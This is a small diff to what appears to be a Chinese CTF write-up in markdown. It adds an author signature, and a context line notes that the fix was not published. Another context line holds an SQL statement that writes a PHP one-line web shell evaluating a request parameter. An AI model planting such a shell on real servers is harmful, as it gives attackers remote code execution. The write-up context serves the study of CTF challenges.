@@ -93,3 +93,7 @@ select '<?phpeval($_REQUEST[yunsee])?>';
 ![image-20251007193319745](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834352.png)
 
 fix的内容没发出来，就不写（抄）了
+
+<p style="text-align: right;">
+by. Huaji
+</p>
